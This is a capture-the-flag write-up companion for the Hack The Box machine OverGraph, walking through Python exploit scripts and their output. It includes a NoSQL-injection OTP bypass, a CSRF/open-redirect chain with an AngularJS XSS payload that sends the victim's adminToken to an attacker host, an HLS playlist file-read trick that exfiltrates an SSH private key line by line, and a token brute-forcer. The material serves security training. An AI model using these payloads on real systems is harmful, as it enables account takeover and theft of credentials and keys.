# Hack The Box. Machines. OverGraph

Machine write-up: https://7rocky.github.io/en/htb/overgraph

### `get_admin_token.py`

This Python script is used to obtain the `adminToken` of another user from `localStorage`. The script chains some web exploits to accomplish this.

For this reason, the script uses a session within `requests`, to keep all cookies in subsequent requests:

```python
URL = 'http://10.10.11.157'
HOST = {'Host': 'internal-api.graph.htb'}

USER = f'rocky'
PASSWORD = 'asdffdsa'
EMAIL = f'{USER}@graph.htb'

s = requests.session()
```

The first thing that it does is register a new account:

```python
def register_user():
    s.post(f'{URL}/api/code', headers=HOST, json={
        'email': EMAIL
    })

    s.post(f'{URL}/api/verify', headers=HOST, json={
        'email': EMAIL,
        'code': {
            '$ne': 'foo'
        }
    })

    s.post(f'{URL}/api/register', headers=HOST, json={
        'email': EMAIL,
        'username': USER,
        'password': PASSWORD,
        'confirmPassword': PASSWORD
    })
```

Here we have the first web exploit, which is a NoSQL injection payload to bypass the OTP code and verify our email accound, so that we can create the account. Then, we log in normally, but using a GraphQL mutation:

```python
def login():
    s.post(f'{URL}/graphql', headers=HOST, json={
        'variables': {
            'email': EMAIL,
            'password': PASSWORD
        },
        'query': '''
            mutation login($email: String!, $password: String!) {
                login(email: $email, password: $password) {
                    email
                    username
                    adminToken
                    id
                    admin
                    firstname
                    lastname
                    __typename
                }
            }
        '''
    })
```

After that, just for information purposes and to check that everything works OK, we can get the JWT token from the `auth` cookie and get out user ID:

```python
def pad(s: str) -> str:
    return s + '=' * (-len(s) % 4)


def main():
    register_user()
    login()

    jwt_token = s.cookies.get('auth')
    own_id = json.loads(b64d(pad(jwt_token.split('.')[1]).encode())).get('id')

    log.success(f'Logged in as {USER} (password: {PASSWORD})')
    log.info(f'JWT token: {jwt_token}')
    log.info(f'Own user ID: {own_id}')
```

The `pad` function is just to add the necessary `=` padding to a Base64 encoded string.

Then, we query the tasks of the victim user employing a GraphQL query to extract its user ID (key `Assignedto`):

```python
    victim_user = 'Mark'

    r = s.post(f'{URL}/graphql', headers=HOST, json={
        'variables': {
            'username': victim_user
        },
        'query': '''
            query tasks($username: String!) {
                tasks(username: $username) {
                    Assignedto
                    __typename
                }
            }
        '''
    })

    victim_id = r.json()['data']['tasks'][0]['Assignedto']
    log.success(f"Victim's ID: {victim_id}")
```

Once we have this user ID, we are able to craft a Cross-Site Request Forgery payload using JavaScript to force the user to update his profile using a GraphQL mutation. The JavaScript code is embedded in the Python script, so that we can format it with other variables:

```python
angularjs_xss_payload = '''{{constructor.constructor('fetch("http://10.10.17.44/" + localStorage.getItem("adminToken"))')()}}'''

    js_payload = '''
        fetch('http://internal-api.graph.htb/graphql', {
          method: 'POST',
          credentials: 'include',
          mode: 'no-cors',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            variables: {
              newusername: '%s',
              id: '%s',
              firstname: `%s`,
              lastname: 'asdf'
            },
            query: `
              mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {
                  update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) {
                      __typename
                  }
              }
            `
          })
        })
    ''' % (victim_user, victim_id, angularjs_xss_payload)
```

As it can be seen, it uses `fetch` to perform a POST request to the GraphQL endpoint with the corresponding mutation and indicating the user ID as `id`.

Notice that there is a variable called `angularjs_xss_payload`. This is the last step of the exploit to get `adminToken` from `localStorage`. There is a Cross-Site Scripting (XSS) injection in the `firstname` field (also in `lastname`), so we can abuse it to access `localStorage` and extract the `adminToken`.

The XSS in AngularJS can be triggered with the following payload:

```
{{constructor.constructor('fetch("http://10.10.17.44/" + localStorage.getItem("adminToken"))')()}}
```

Again, it uses petch to send the `adminToken` as the path to a local HTTP server.

Finally, to trigger the attack, we must send the victim user a link (Cross-Site Request Forgery). This must be done with another GraphQL mutation, so we will leave a message with the malicious URL and wait until the user goes in it.

This malicious URL contains inline JavaScript because it abuses an Open Redirect vulnerability. This is relevant because the JWT token must be sent as a cookie and it has `httpOnly` set to true, so the requests must be performed from the same domain so that cookies flow with the request.

To enter a large JavaScript code as inline JavaScript in the URL, we can encode it in Base64 and send it as ``javascript:eval(atob`<base64-data>`)``. So here's the GraphQL mutation with all the previous things:

```python
    csrf_payload = f'javascript:eval(atob`{b64e(js_payload.encode()).strip("=")}`)'

    s.post(f'{URL}/graphql', headers=HOST, json={
        'variables': {
            'to': f'{victim_user.lower()}@graph.htb',
            'text': f'http://graph.htb/?redirect={csrf_payload}'
        },
        'query': '''
            mutation sendMessage($to: String!, $text: String!) {
                sendMessage(to: $to, text: $text) {
                    __typename
                }
            }
        '''
    })
```

To retrieve the `adminToken`, we can use `listen` from `pwntools` to receive connections on port 80 and extract the `adminToken`:

```python
    http = listen(80)
    http.wait_for_connection()
    admin_token = http.recvuntil(b'HTTP').split()[1][1:].decode()
    http.close()

    log.success(f'adminToken: {admin_token}')
```

Here we have an example of execution:

```console
$ python3 get_admin_token.py
[+] Logged in as rocky (password: asdffdsa)
[*] JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYyZTdhNmRmNGUyOThkMDQzNGRkMWZjMyIsImVtYWlsIjoicm9ja3lAZ3JhcGguaHRiIiwiaWF0IjoxNjU5MzQ5MTMwLCJleHAiOjE2NTk0MzU1MzB9.buvUeGkubEoMwDRN-aoH28l2ynIVjdX1HXInWK4mPrM  
[*] Own user ID: 62e7a6df4e298d0434dd1fc3
[+] Victim's ID: 62e7a42181fe151459e90ea6
[+] Trying to bind to :: on port 80: Done
[+] Waiting for connections on :::80: Got connection from ::ffff:10.10.11.157 on port 34196
[*] Closed connection to ::ffff:10.10.11.157 port 34196
[+] adminToken: c0b9db4c8e4bbb24d59a3aaffa8c8b83
```

### `extract_id_rsa.py`

This Python script is used to automate the extraction of the file `/home/user/.ssh/id_rsa`. The situation is that we can read files from the server but line by line, so it will be very tedious to do it manually.

In order to read a single line, we must modify a text file called `video.avi` with the needed offset, according to the place where we wan to read from the file, then upload it to the website and finally receive the line in our HTTP server.

This script uses Flask as HTTP server to retrieve the lines of the files and `requests` to perform the file upload.

We start by parsing the command line arguments and setting up the Flask server:

```python
app = Flask(__name__)
file = ['-----BEGIN OPENSSH PRIVATE KEY-----']
enable = 0

def main():
    global IP
    global admin_token

    if len(sys.argv) != 3:
        print(f'Usage: python3 {sys.argv[0]} <lhost> <adminToken>')
        exit(1)

    IP = sys.argv[1]
    admin_token = sys.argv[2]


if __name__ == '__main__':
    main()
    upload_video(len(file[0]) + 1)
    app.run(host='0.0.0.0', port=80, debug=True)
```

Then, we upload the `video.avi` file with the corresponding offset (here, the `id_rsa` header was already set because it causes an error when Flask receives it, since there are some whitespaces aht Flask is not able to parse the HTTP request):

```python
def upload_video(offset: int):
    global IP
    global admin_token

    if offset > 10000:
        os._exit(0)

    payload = f'''
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://{IP}/header.m3u8|subfile,,start,{offset},end,10000,,:/home/user/.ssh/id_rsa
#EXT-X-ENDLIST
'''[1:]

    requests.post('http://10.10.11.157/admin/video/upload', headers={
        'Host': 'internal-api.graph.htb',
        'admintoken': admin_token
    }, files=[
        ('file', ('video.avi', payload.encode(), 'video/x-msvideo'))
    ])
```

So the `upload_video` function puts the corresponding offset into the `video.avi` file and uploads it to the server as `multipart/form-data` with `video/x-msvideo` content type. Notice that the file path is hard-coded (`/home/user/.ssh/id_rsa`) because this script is used specifically to extract this file.

We must enter the `adminToken` obtaind with the previous script in order to use the file upload utility.

The Flask server has two routes configured:

```python
enable = 0


@app.route('/header.m3u8', methods=['GET'])
def header():
    global IP
    global enable

    if enable < 2:
        enable += 1
        return f'#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://{IP}/?d='
    else:
        upload_video(len('\n'.join(file)) + 1)
        enable = 0

    return ''


@app.route('/', methods=['GET'])
def index():
    data = request.args.get('d').replace(' ', '+')
    file.append(data)
    write_file()

    return ''
```

The first one is just to return a file that must be present in order to run the exploit (the `enable` variable is used to block subsequent requests and force to upload the `video.avi` file with the next offset). The file `header.m3u8` must end in `http://{IP}/?d=` so that the line of the file is appended to that URL and we can receive it in the `d` parameter. Once it is received, it is added to the `file` variable and written to the `id_rsa` file:

```python
def write_file():
    with open('id_rsa', 'w') as f:
        f.write('\n'.join(file) + '\n-----END OPENSSH PRIVATE KEY-----\n')
```

I set the footer of the `id_rsa` file because it causes an error in Flask, since the line contains white spaces and Flask is not able to parse the request.

In the end, we will get the fill `id_rsa` file:

```console
$ python3 extract_file.py 10.10.17.44 c0b9db4c8e4bbb24d59a3aaffa8c8b83
 * Serving Flask app 'extract_file' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on all addresses (0.0.0.0)
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://0.0.0.0:80 (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: XXX-XXX-XXX
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW HTTP/1.1" 200 -  
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /?d=3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw== HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] "GET /header.m3u8 HTTP/1.1" 200 -
10.10.11.157 - - [] code 400, message Bad request syntax ('GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1')
10.10.11.157 - - [] "GET /?d=-----END OPENSSH PRIVATE KEY----- HTTP/1.1" HTTPStatus.BAD_REQUEST -
^C

$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDAAAAJjebJ3U3myd
1AAAAAtzc2gtZWQyNTUxOQAAACAvdFWzL7vVSn9cH6fgB3Sgtt2OG4XRGYh5ugf8FLAYDA
AAAEDzdpSxHTz6JXGQhbQsRsDbZoJ+8d3FI5MZ1SJ4NGmdYC90VbMvu9VKf1wfp+AHdKC2
3Y4bhdEZiHm6B/wUsBgMAAAADnVzZXJAb3ZlcmdyYXBoAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

### `bf_token.py`

This Python script is used to compute a valid token in order to use the `nreport` binary. The program expects a 14-byte token, but the checks only involve 5 of these bytes, so we can try random bytes at these 5 positions and enter a fix byte in the rest of the token until we find a token that is valid.

The script uses `pwntools` to interact with the binary:

```python
from pwn import context, log
from random import randint

context.binary = 'nreport_patched'
context.log_level = 'CRITICAL'
```

Within an infinite `while` loop, we will compute 5 random numbers and enter them as bytes in the expected positions of the token (the rest of the positions will be filled with `A` characters):

```python
test_bytes = [randint(0x30, 0x7e) for _ in range(5)]
test_token = bytes(test_bytes[:3]) + b'A' * 6 + \
    bytes([test_bytes[3]]) + b'A' * 3 + bytes([test_bytes[4]])
```

Then, we start the process and send the token:

```python
p = context.binary.process()
p.recv()
p.sendline(test_token)
msg = p.recv(timeout=1)
```

Finally, if there is no error message (`Invalid token`), we will have a valid token and then we can exit the program:

```python
if b'Invalid Token' not in msg:
    with context.local(log_level='DEBUG'):
        print()
        log.success(f'Valid token: {test_token.decode()}')

    p.close()
    break

p.close()
```

This is an example of execution:

```console
$ python3 bf_token.py
[*] './nreport_patched'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'./libc'

[+] Valid token: hD]AAAAAAVAAAT
```

### `exploit_rce.py` and `exploit_write.py`

The [write-up](https://7rocky.github.io/en/htb/overgraph/#planning-the-exploit) provides all the explanation for these scripts.
